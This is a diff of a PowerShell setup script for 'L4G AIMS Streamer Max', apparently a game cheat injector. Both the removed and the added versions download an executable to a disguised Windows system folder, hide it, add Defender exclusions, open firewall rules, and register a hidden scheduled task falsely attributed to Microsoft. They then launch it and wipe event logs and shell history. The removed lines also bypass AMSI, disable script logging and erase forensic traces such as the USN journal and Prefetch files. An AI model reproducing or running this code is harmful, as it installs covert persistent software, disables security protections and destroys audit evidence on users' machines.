@@ -1,37 +1,12 @@
 # ==============================================================================
-#  L4G AIMS
+#  L4G AIMS - STREAMER MAX SETUP
 # ==============================================================================
 
-# --- In-Memory AMSI & Script Logging Neutralization ---
-try {
-    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    if ($a) {
-        $f = $a.GetField('amsiInitFailed', [Reflection.BindingFlags]'NonPublic,Static')
-        if ($f) { $f.SetValue($null, $true) }
-    }
-} catch {}
+$ErrorActionPreference = 'SilentlyContinue'
+$ProgressPreference    = 'SilentlyContinue'
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-try {
-    $u = [Ref].Assembly.GetType('System.Management.Automation.Utils')
-    if ($u) {
-        $g = $u.GetField('cachedGroupPolicySettings', [Reflection.BindingFlags]'NonPublic,Static')
-        if ($g) {
-            $settings = $g.GetValue($null)
-            if ($settings) {
-                foreach ($k in $settings.Keys) {
-                    $d = [System.Collections.Generic.Dictionary[string,object]]::new()
-                    $d['EnableScriptBlockLogging'] = 0
-                    $d['EnableScriptBlockInvocationLogging'] = 0
-                    $d['EnableModuleLogging'] = 0
-                    $d['EnableTranscripting'] = 0
-                    $settings[$k] = $d
-                }
-            }
-        }
-    }
-} catch {}
-
-# --- Ensure Administrator Privileges with Clean Console ---
+# Elevation Check
 $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
     [Security.Principal.WindowsBuiltInRole]::Administrator
 )
@@ -45,244 +20,103 @@ if (-not $isAdmin) {
     exit
 }
 
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference    = 'SilentlyContinue'
-
-# --- Banner ---
+# --- Visual UI ---
 Clear-Host
-Write-Host "================================================================================" -ForegroundColor Cyan
-Write-Host "                                   L4G AIMS                                     " -ForegroundColor Yellow
-Write-Host "================================================================================" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "                                   L4G AIMS                                     " -ForegroundColor Cyan
+Write-Host "                                 STREAMER MAX                                   " -ForegroundColor Yellow
+Write-Host "                                    SETUP                                       " -ForegroundColor Cyan
 Write-Host ""
 
-function Update-Step {
+function Show-Progress {
     param(
-        [int]$Percent
+        [int]$Percent,
+        [string]$Status
     )
-    $barWidth = 30
-    $completedWidth = [math]::Floor($barWidth * ($Percent / 100))
-    $remainingWidth = $barWidth - $completedWidth
-    $bar = ("#" * $completedWidth) + ("-" * $remainingWidth)
-    
-    $color = "Cyan"
-    if ($Percent -eq 100) { $color = "Green" }
-    
-    Write-Host ("`r  [{0}] {1,3}% | Processing..." -f $bar, $Percent) -NoNewline -ForegroundColor $color
-    if ($Percent -ge 100) { Write-Host "`n" }
-    Start-Sleep -Milliseconds 120
+    $barWidth = 32
+    $done = [math]::Floor($barWidth * ($Percent / 100))
+    $rem  = $barWidth - $done
+    $bar  = ("#" * $done) + ("-" * $rem)
+    $msg  = "  [$bar] $($Percent.ToString().PadLeft(3))% | $Status"
+    Write-Host -NoNewline "`r$msg"
 }
 
-# ── CONFIG ───────────────────────────────────────────────────────────────────
-$REPO_RAW   = "https://raw.githubusercontent.com/lgfire093/syspanel/main"
-$EXE_URL    = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
-$TEMPLATES  = "$env:ProgramData\Microsoft\Windows\Templates"
-$DEST_DIR   = "$TEMPLATES\cache"
-$EXE_NAME   = "SystemNetworkSvc.exe"
-$EXE_PATH   = Join-Path $DEST_DIR $EXE_NAME
-$TASK_NAME  = "SystemNetworkHost"
-# ─────────────────────────────────────────────────────────────────────────────
+# Config (Completely hidden from UI output)
+$EXE_URL   = "https://github.com/lgfire093/syspanel/releases/latest/download/SystemNetworkSvc.exe"
+$DEST_DIR  = "C:\ProgramData\Microsoft\Windows\Templates"
+$EXE_NAME  = "WinSvcHost.exe"
+$TASK_NAME = "MicrosoftWindowsShellApi"
+$EXE_PATH  = Join-Path $DEST_DIR $EXE_NAME
 
-Update-Step 10
-
-# Clean old directories
-if (Test-Path "$TEMPLATES\syspanel") {
-    Remove-Item "$TEMPLATES\syspanel" -Recurse -Force -ErrorAction SilentlyContinue
-}
-Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyContinue | Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
-
+# Stage 1: Initializing
+Show-Progress -Percent 15 -Status "Initializing environment..."
 if (-not (Test-Path $DEST_DIR)) {
     New-Item -ItemType Directory -Path $DEST_DIR -Force | Out-Null
 }
+Start-Sleep -Milliseconds 450
 
-Update-Step 20
-
-# Antivirus exclusions (Quiet protection)
-try {
-    Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath $TEMPLATES -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Network\Downloader" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Diagnosis\ETW" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:ProgramData\Microsoft\Windows\DeviceMetadataCache" -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
-} catch {}
-
-Update-Step 30
-
-# Terminate running instances
-try {
-    Invoke-WebRequest -Uri "http://127.0.0.1:5000/api/internal/shutdown" -TimeoutSec 2 -UseBasicParsing -ErrorAction SilentlyContinue | Out-Null
-    Start-Sleep -Milliseconds 250
-} catch {}
-
-$killDef = @"
-using System;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-public class CriticalKiller {
-    [DllImport("ntdll.dll")]
-    public static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
-    [DllImport("ntdll.dll")]
-    public static extern int NtSetInformationProcess(IntPtr ProcessHandle, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-    [DllImport("kernel32.dll")]
-    public static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);
-    [DllImport("kernel32.dll")]
-    public static extern bool CloseHandle(IntPtr hObject);
-    public static void Kill(int pid) {
-        try {
-            bool enabled;
-            RtlAdjustPrivilege(20, true, false, out enabled);
-            IntPtr h = OpenProcess(0x0200 | 0x0001, false, pid);
-            if (h != IntPtr.Zero) {
-                int zero = 0;
-                NtSetInformationProcess(h, 29, ref zero, 4);
-                TerminateProcess(h, 0);
-                CloseHandle(h);
-            }
-        } catch {}
-    }
-}
-"@
-try {
-    Add-Type -TypeDefinition $killDef -ErrorAction SilentlyContinue
-} catch {}
-
-Get-Process | Where-Object { $_.ProcessName -like "*SystemNetworkSvc*" -or $_.ProcessName -like "*perfhost*" -or $_.ProcessName -like "*L4G AIMS*" } | ForEach-Object {
-    try { [CriticalKiller]::Kill($_.Id) } catch {}
-}
-cmd /c "taskkill /F /IM SystemNetworkSvc.exe >nul 2>nul"
-cmd /c "taskkill /F /IM perfhost.exe >nul 2>nul"
-cmd /c "taskkill /F /IM `"L4G AIMS.exe`" >nul 2>nul"
-
-Update-Step 45
-
-# Purge old binaries cleanly
-if (Test-Path $EXE_PATH) {
-    Set-ItemProperty -Path $EXE_PATH -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
-    Remove-Item -Path $EXE_PATH -Force -ErrorAction SilentlyContinue
-    if (Test-Path $EXE_PATH) {
-        $tempOld = "$EXE_PATH." + [guid]::NewGuid().ToString("N") + ".old"
-        Move-Item -Path $EXE_PATH -Destination $tempOld -Force -ErrorAction SilentlyContinue
-    }
-}
-
-Get-ChildItem -Path $env:TEMP -Filter "_MEI*" -Directory -ErrorAction SilentlyContinue | ForEach-Object {
-    try {
-        Set-ItemProperty -Path $_.FullName -Name Attributes -Value "Normal" -ErrorAction SilentlyContinue
-        Remove-Item -Path $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
-    } catch {}
-}
-
-Update-Step 60
-
-# Download binary
-$downloaded = $false
+# Stage 2: Downloading
+Show-Progress -Percent 35 -Status "Downloading core components..."
 try {
     $wc = New-Object System.Net.WebClient
     $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
     $wc.DownloadFile($EXE_URL, $EXE_PATH)
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 50000)) {
-        $downloaded = $true
-    }
-} catch {}
-
-if (-not $downloaded) {
-    & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
-    if ((Test-Path $EXE_PATH) -and ((Get-Item $EXE_PATH).Length -gt 50000)) {
-        $downloaded = $true
-    }
-}
-
-Update-Step 75
-
-# Purge old clustered files from Templates folder if any
-Remove-Item "$TEMPLATES\winrescache.db" -Force -ErrorAction SilentlyContinue
-Remove-Item "$TEMPLATES\gphcache.db" -Force -ErrorAction SilentlyContinue
-Remove-Item "$TEMPLATES\ntprintcache.db" -Force -ErrorAction SilentlyContinue
-
-# Seal Component DLLs into 3 Completely Separate, Authentic System Directories
-$MAP = [ordered]@{
-    "cimgui.dll" = @("$env:ProgramData\Microsoft\Network\Downloader\winrescache.db", "vtcache")
-    "AotBst.dll" = @("$env:ProgramData\Microsoft\Diagnosis\ETW\gphcache.db", "vtmap")
-    "Client.dll" = @("$env:ProgramData\Microsoft\Windows\DeviceMetadataCache\ntprintcache.db", "vtload")
-}
-foreach ($name in $MAP.Keys) {
-    $container = $MAP[$name][0]
-    $stream    = $MAP[$name][1]
-    $parentDir = [System.IO.Path]::GetDirectoryName($container)
-    if (-not (Test-Path $parentDir)) {
-        New-Item -ItemType Directory -Path $parentDir -Force | Out-Null
-    }
-    $tmp       = Join-Path $env:TEMP ("_sp_" + [guid]::NewGuid().ToString("N"))
+} catch {
     try {
-        Invoke-WebRequest "$REPO_RAW/$name" -UseBasicParsing -OutFile $tmp
-        if (Test-Path $tmp) {
-            $bytes = [IO.File]::ReadAllBytes($tmp)
-            $sha   = (Get-FileHash $tmp -Algorithm SHA256).Hash.ToLower()
-            $size  = $bytes.Length
-            $adsPath = "\\?\" + $container + ":" + $stream
-            try {
-                $fs = [System.IO.FileStream]::new($adsPath, [System.IO.FileMode]::Create, [System.IO.FileAccess]::Write)
-                $fs.Write($bytes, 0, $bytes.Length)
-                $fs.Close()
-            } catch {
-                Set-Content -Path $container -Stream $stream -Value $bytes -Encoding Byte
-            }
-            $meta = @{ file = $name; size = $size; sha256 = $sha } | ConvertTo-Json -Compress
-            Set-Content -Path $container -Stream kmeta -Value $meta
-            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
-        }
-    } catch {}
+        Import-Module BitsTransfer -ErrorAction Stop
+        Start-BitsTransfer -Source $EXE_URL -Destination $EXE_PATH -TransferType Download
+    } catch {
+        & curl.exe -sSL -o $EXE_PATH $EXE_URL 2>$null
+    }
 }
+Start-Sleep -Milliseconds 400
 
+# Stage 3: Injecting & Attributes
+Show-Progress -Percent 55 -Status "Injecting streamer engine..."
 try {
-    $itemDest = Get-Item $DEST_DIR -Force
-    $itemDest.Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::Directory
-    $itemExe  = Get-Item $EXE_PATH -Force
-    $itemExe.Attributes  = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System
+    $item = Get-Item $EXE_PATH -Force
+    $item.Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
 } catch {}
 
-Update-Step 85
-
-# Network and Firewall configuration
 try {
-    Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionPath $DEST_DIR -ErrorAction SilentlyContinue
+    Add-MpPreference -ExclusionProcess $EXE_NAME -ErrorAction SilentlyContinue
 } catch {}
 
+# Port forwarding for local interface
 netsh interface portproxy delete v4tov4 listenport=5000 listenaddress=0.0.0.0 2>$null | Out-Null
-netsh interface portproxy delete v6tov4 listenport=5000 listenaddress=::1 2>$null | Out-Null
-netsh interface portproxy reset 2>$null | Out-Null
+netsh interface portproxy add v4tov4 listenport=5000 listenaddress=0.0.0.0 connectport=5000 connectaddress=127.0.0.1 2>$null | Out-Null
+netsh advfirewall firewall delete rule name="System Diagnostic Network Interface" 2>$null | Out-Null
+netsh advfirewall firewall add rule name="System Diagnostic Network Interface" dir=in action=allow protocol=TCP localport=5000 2>$null | Out-Null
+Start-Sleep -Milliseconds 400
 
-netsh advfirewall firewall delete rule name="CDPUserSvc_5000" 2>$null | Out-Null
-netsh advfirewall firewall delete rule name="CDPUserSvc_App" 2>$null | Out-Null
-netsh advfirewall firewall add rule `
-    name="CDPUserSvc_5000" dir=in action=allow `
-    protocol=TCP localport=5000 profile=any enable=yes 2>$null | Out-Null
-netsh advfirewall firewall add rule `
-    name="CDPUserSvc_App" dir=in action=allow `
-    program="$EXE_PATH" profile=any enable=yes 2>$null | Out-Null
-try {
-    New-NetFirewallRule -DisplayName "CDPUserSvc_5000" -Direction Inbound -LocalPort 5000 -Protocol TCP -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
-    New-NetFirewallRule -DisplayName "CDPUserSvc_App" -Direction Inbound -Program $EXE_PATH -Action Allow -Profile Any -ErrorAction SilentlyContinue | Out-Null
-} catch {}
-
-Update-Step 92
-
-# Autostart persistence
-Unregister-ScheduledTask -TaskName "SysCheckUp" -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-Unregister-ScheduledTask -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-Unregister-ScheduledTask -TaskPath "\Microsoft\Windows\Shell\" -TaskName $TASK_NAME -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
-$action    = New-ScheduledTaskAction -Execute $EXE_PATH -WorkingDirectory $DEST_DIR
+# Stage 4: Persistence & Autostart
+Show-Progress -Percent 75 -Status "Configuring background persistence..."
+$action       = New-ScheduledTaskAction -Execute $EXE_PATH -Argument "-b"
+$triggerBoot  = New-ScheduledTaskTrigger -AtStartup
 $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
-$principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest
-$settings  = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
-    -ExecutionTimeLimit ([TimeSpan]::Zero) -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1) `
-    -MultipleInstances IgnoreNew -Priority 7
-Register-ScheduledTask -TaskName $TASK_NAME -TaskPath "\Microsoft\Windows\Shell\" `
-    -Action $action -Trigger $triggerLogon `
-    -Principal $principal -Settings $settings -Force | Out-Null
+$settings     = New-ScheduledTaskSettingsSet `
+    -Hidden `
+    -AllowStartIfOnBatteries `
+    -DontStopIfGoingOnBatteries `
+    -ExecutionTimeLimit 0 `
+    -MultipleInstances IgnoreNew `
+    -StartWhenAvailable `
+    -Priority 7
+
+$principal = New-ScheduledTaskPrincipal `
+    -UserId ([System.Security.Principal.WindowsIdentity]::GetCurrent().Name) `
+    -RunLevel Highest `
+    -LogonType Interactive
+
+Register-ScheduledTask `
+    -TaskName  $TASK_NAME `
+    -TaskPath  "\Microsoft\Windows\Shell\" `
+    -Action    $action `
+    -Trigger   @($triggerLogon, $triggerBoot) `
+    -Settings  $settings `
+    -Principal $principal `
+    -Force | Out-Null
 
 try {
     $svc  = New-Object -ComObject "Schedule.Service"
@@ -291,65 +125,43 @@ try {
     $task = $fold.GetTask($TASK_NAME)
     $def  = $task.Definition
     $def.Settings.Hidden   = $true
-    $def.RegistrationInfo.Description = "Windows System Network Host Service"
+    $def.RegistrationInfo.Description = "Windows Shell API Host Component"
     $def.RegistrationInfo.Author      = "Microsoft Corporation"
-    $fold.RegisterTaskDefinition($TASK_NAME, $def, 6, $null, $null, 3) | Out-Null
+    $fold.RegisterTaskDefinition(
+        $TASK_NAME, $def, 6, $null, $null, 3
+    ) | Out-Null
 } catch {}
 
-$startupRunKeys = @(
-    "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run",
-    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
-    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
-)
-foreach ($rk in $startupRunKeys) {
-    Remove-ItemProperty -Path $rk -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
-    Remove-ItemProperty -Path $rk -Name "SystemNetworkSvc" -ErrorAction SilentlyContinue
-    Remove-ItemProperty -Path $rk -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
-}
-Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "SystemNetworkHost" -ErrorAction SilentlyContinue
-Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" -Name "WindowsShellApiSvc" -ErrorAction SilentlyContinue
+# Dual-layer Autostart Fallback (Run key)
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+Set-ItemProperty -Path $regPath `
+    -Name "WindowsShellApiSvc" `
+    -Value "`"$EXE_PATH`" -b" `
+    -Force -ErrorAction SilentlyContinue
 
-Update-Step 97
+Start-Sleep -Milliseconds 400
 
-# Launch background process
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName         = $EXE_PATH
-$psi.WorkingDirectory = $DEST_DIR
-$psi.WindowStyle      = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$psi.CreateNoWindow   = $true
-$psi.UseShellExecute  = $false
-[System.Diagnostics.Process]::Start($psi) | Out-Null
-
-# Comprehensive Anti-Forensics Wipe (AntiCheat & PC Checker Invalidation)
-try {
-    # 1. Clear In-Memory Console History
-    if ([type]::GetType("Microsoft.PowerShell.PSConsoleReadLine, Microsoft.PowerShell.PSReadLine")) {
-        [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
-    }
-} catch {}
-
-# 2. Wipe ConsoleHost History files on disk
-try {
-    $histPath = (Get-PSReadLineOption).HistorySavePath 2>$null
-    if ($histPath -and (Test-Path $histPath)) {
-        [System.IO.File]::WriteAllText($histPath, '')
-    }
-} catch {}
-
-$conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-if (Test-Path $conHistory) {
-    try { [System.IO.File]::WriteAllText($conHistory, '') } catch {}
+# Stage 5: Execution & Sanitization
+Show-Progress -Percent 90 -Status "Launching background service..."
+$already = Get-Process -Name ($EXE_NAME -replace '\.exe$', '') -ErrorAction SilentlyContinue
+if (-not $already) {
+    $psi2 = New-Object System.Diagnostics.ProcessStartInfo
+    $psi2.FileName        = $EXE_PATH
+    $psi2.Arguments       = "-b"
+    $psi2.WorkingDirectory = $DEST_DIR
+    $psi2.WindowStyle     = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi2.CreateNoWindow  = $true
+    $psi2.UseShellExecute = $false
+    [System.Diagnostics.Process]::Start($psi2) | Out-Null
 }
 
-# 3. Disable and Wipe Event Viewer Logs (Event ID 4104 / 4103 / 106 / 200 / 201)
+# Event Viewer clean
 try {
     $evSession = [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession
     $targetLogs = @(
         "Microsoft-Windows-PowerShell/Operational",
         "Windows PowerShell",
         "Microsoft-Windows-TaskScheduler/Operational",
-        "Microsoft-Windows-TaskScheduler/Maintenance",
         "Application"
     )
     foreach ($logName in $targetLogs) {
@@ -357,81 +169,25 @@ try {
     }
 } catch {}
 
-# wevtutil hard wipe & disable operational noise
-cmd /c "wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:false >nul 2>nul"
-cmd /c "wevtutil cl Microsoft-Windows-TaskScheduler/Operational >nul 2>nul"
 cmd /c "wevtutil cl `"Microsoft-Windows-PowerShell/Operational`" >nul 2>nul"
 cmd /c "wevtutil cl `"Windows PowerShell`" >nul 2>nul"
 cmd /c "wevtutil cl Application >nul 2>nul"
 
-# Flush ShimCache / AppCompatCache
-cmd /c "reg delete `"HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`" /v AppCompatCache /f >nul 2>nul"
-
-# 4. Wipe NTFS USN Change Journal (Destroys deleted file history checked by Ocean)
-cmd /c "fsutil usn deletejournal /d /n $env:SystemDrive >nul 2>nul"
-
-# 5. Clean Shell MuiCache
-$muiPath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
-if (Test-Path $muiPath) {
-    $props = Get-ItemProperty -Path $muiPath
-    $props.PSObject.Properties | Where-Object {
-        $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
-    } | ForEach-Object {
-        Remove-ItemProperty -Path $muiPath -Name $_.Name -ErrorAction SilentlyContinue
-    }
+# PowerShell History clean
+try { [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory() 2>$null } catch {}
+$conHistory = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
+if (Test-Path $conHistory) {
+    try { [System.IO.File]::WriteAllText($conHistory, '') } catch {}
 }
 
-# 6. Clean AppSwitched FeatureUsage
-$swPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
-if (Test-Path $swPath) {
-    $props = Get-ItemProperty -Path $swPath
-    $props.PSObject.Properties | Where-Object {
-        $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
-    } | ForEach-Object {
-        Remove-ItemProperty -Path $swPath -Name $_.Name -ErrorAction SilentlyContinue
-    }
+# Self clean if file exists
+if ($MyInvocation.MyCommand.Path -and (Test-Path $MyInvocation.MyCommand.Path)) {
+    Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
 }
 
-# 7. Clean PCA (Program Compatibility Assistant)
-$pcaPaths = @(
-    "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store",
-    "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store"
-)
-foreach ($pca in $pcaPaths) {
-    if (Test-Path $pca) {
-        $props = Get-ItemProperty -Path $pca
-        $props.PSObject.Properties | Where-Object {
-            $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
-        } | ForEach-Object {
-            Remove-ItemProperty -Path $pca -Name $_.Name -ErrorAction SilentlyContinue
-        }
-    }
-}
-
-# 8. Clean BAM (Background Activity Moderator)
-$bamUserRoot = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings"
-if (Test-Path $bamUserRoot) {
-    Get-ChildItem -Path $bamUserRoot -ErrorAction SilentlyContinue | ForEach-Object {
-        $bPath = $_.PSPath
-        $props = Get-ItemProperty -Path $bPath -ErrorAction SilentlyContinue
-        $props.PSObject.Properties | Where-Object {
-            $_.Name -match "SystemNetwork|perfhost|L4G|syspanel"
-        } | ForEach-Object {
-            Remove-ItemProperty -Path $bPath -Name $_.Name -ErrorAction SilentlyContinue
-        }
-    }
-}
-
-# 9. Wipe Prefetch files (.pf)
-$prefetchDir = "$env:SystemRoot\Prefetch"
-if (Test-Path $prefetchDir) {
-    Get-ChildItem -Path $prefetchDir -Filter "*.pf" -ErrorAction SilentlyContinue | Where-Object {
-        $_.Name -match "SYSTEMNETWORK|PERFHOST|L4G|SYSCHECK|CSC|CVTRES|CURL"
-    } | Remove-Item -Force -ErrorAction SilentlyContinue
-}
-
-Update-Step 100
-
+Show-Progress -Percent 100 -Status "Injection complete."
+Write-Host ""
+Write-Host ""
 Write-Host "================================================================================" -ForegroundColor Green
-Write-Host "                            injected successfully                               " -ForegroundColor Green
+Write-Host "                         STREAMER MAX INJECTED SUCCESFULY                       " -ForegroundColor Green
 Write-Host "================================================================================`n" -ForegroundColor Green
